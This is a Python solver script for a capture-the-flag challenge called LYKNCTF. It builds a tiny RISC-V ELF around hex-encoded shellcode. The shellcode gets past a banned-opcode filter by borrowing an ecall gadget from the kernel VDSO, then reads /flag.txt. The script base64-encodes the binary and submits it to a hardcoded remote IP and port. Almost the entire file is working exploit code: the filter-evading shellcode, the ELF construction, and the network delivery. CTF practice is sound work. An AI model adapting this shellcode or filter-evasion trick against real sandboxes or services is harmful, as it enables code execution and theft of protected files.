#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import re
import socket
import struct
import sys
import time

# RISC-V shellcode assembled for VA 0x100b0.
# It finds AT_SYSINFO_EHDR, uses the kernel-provided VDSO gadget at +0xc50
# (ecall; ret), then performs openat/read/write on /flag.txt.
TEXT = bytes.fromhex(
    "0a879307100214632107e39ef6fe0063"
    "85673e94130404c51305c0f997050000"
    "938525030146930880030294aa842685"
    "8a85130600109308f00302942a860545"
    "93080004029401459308d00502942f66"
    "6c61672e74787400"
)


def build_elf() -> bytes:
    ehsize = 0x40
    phentsize = 0x38
    phnum = 2
    text_off = ehsize + phentsize * phnum
    text_addr = 0x10000 + text_off
    shentsize = 0x40
    shnum = 3
    shoff = text_off + len(TEXT)
    total = shoff + shentsize * shnum
    shstr = b"\x00.text\x00.shstrtab\x00"

    elf = bytearray(total)

    ident = bytearray(16)
    ident[:4] = b"\x7fELF"
    ident[4] = 2
    ident[5] = 1
    ident[6] = 1
    elf[:16] = ident

    struct.pack_into(
        "<HHIQQQIHHHHHH",
        elf,
        0x10,
        2,
        0xF3,
        1,
        text_addr,
        ehsize,
        shoff,
        0,
        ehsize,
        phentsize,
        phnum,
        shentsize,
        shnum,
        2,
    )

    struct.pack_into(
        "<IIQQQQQQ",
        elf,
        0x40,
        1,
        5,
        0,
        0x10000,
        0x10000,
        total,
        0x1000,
        0x1000,
    )

    struct.pack_into(
        "<IIQQQQQQ",
        elf,
        0x78,
        1,
        6,
        0,
        0x210000,
        0x210000,
        0,
        0x1000,
        0x1000,
    )

    elf[text_off:text_off + len(TEXT)] = TEXT

    shstr_off = shoff + 0x2F
    elf[shstr_off:shstr_off + len(shstr)] = shstr

    struct.pack_into(
        "<IIQQQQIIQQ",
        elf,
        shoff + shentsize,
        1,
        1,
        6,
        text_addr,
        text_off,
        len(TEXT),
        0,
        0,
        2,
        0,
    )

    struct.pack_into(
        "<IIQQQQIIQQ",
        elf,
        shoff + shentsize * 2,
        7,
        3,
        0,
        0,
        shstr_off,
        len(shstr),
        0,
        0,
        1,
        0,
    )

    if not (0xB0 <= len(elf) <= 0x1E1):
        raise RuntimeError(f"invalid ELF size: {len(elf)}")

    if len(TEXT) > 0x71:
        raise RuntimeError(f"text too large: {len(TEXT)}")

    for bad in (
        b"\x73\x00\x00\x00",
        b"\x73\x00\x10\x00",
        b"\x02\x90",
    ):
        if bad in elf:
            raise RuntimeError(f"forbidden opcode bytes: {bad.hex()}")

    for index in range(len(TEXT) - 3):
        if len(set(TEXT[index:index + 4])) == 1:
            raise RuntimeError(
                f"four repeated text bytes at {index:#x}"
            )

    return bytes(elf)


def recv_until(
    sock: socket.socket,
    marker: bytes,
    timeout: float,
) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()

    while marker not in data:
        chunk = sock.recv(4096)

        if not chunk:
            break

        data.extend(chunk)

    return bytes(data)


def recv_remaining(
    sock: socket.socket,
    idle_timeout: float = 3.0,
) -> bytes:
    sock.settimeout(idle_timeout)
    data = bytearray()

    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break

        if not chunk:
            break

        data.extend(chunk)

    return bytes(data)


def exploit(
    host: str,
    port: int,
    timeout: float,
) -> str:
    elf = build_elf()
    encoded = base64.b64encode(elf)

    print(f"[+] text size : {len(TEXT)} bytes")
    print(f"[+] ELF size  : {len(elf)} bytes")
    print(f"[+] Base64    : {len(encoded)} bytes")

    last_error: Exception | None = None

    for attempt in range(1, 6):
        try:
            print(
                f"[*] connecting to {host}:{port} "
                f"(attempt {attempt}/5)"
            )

            with socket.create_connection(
                (host, port),
                timeout=timeout,
            ) as sock:
                banner = recv_until(
                    sock,
                    b"base64): ",
                    timeout,
                )

                sys.stdout.write(
                    banner.decode(
                        "utf-8",
                        errors="replace",
                    )
                )
                sys.stdout.flush()

                sock.sendall(encoded + b"\n")

                output = recv_remaining(
                    sock,
                    idle_timeout=5.0,
                )

                text = output.decode(
                    "utf-8",
                    errors="replace",
                )

                print(
                    text,
                    end="" if text.endswith("\n") else "\n",
                )

                return text

        except (OSError, socket.timeout) as exc:
            last_error = exc

            if attempt != 5:
                time.sleep(1.0)

    raise RuntimeError(
        f"connection failed: {last_error}"
    )


def main() -> int:
    parser = argparse.ArgumentParser(
        description="LYKNCTF golfing solver"
    )

    parser.add_argument(
        "host",
        nargs="?",
        default="15.235.202.47",
    )

    parser.add_argument(
        "port",
        nargs="?",
        type=int,
        default=9002,
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
    )

    args = parser.parse_args()

    try:
        output = exploit(
            args.host,
            args.port,
            args.timeout,
        )
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1

    match = re.search(
        r"(?:LYKN(?:CTF)?|[A-Za-z0-9_]+)"
        r"\{[^}\r\n]+\}",
        output,
    )

    if match:
        print(f"<FLAG>{match.group(0)}</FLAG>")
        return 0

    print(
        "[-] payload sent, but no flag pattern was found",
        file=sys.stderr,
    )

    return 2


if __name__ == "__main__":
    raise SystemExit(main())
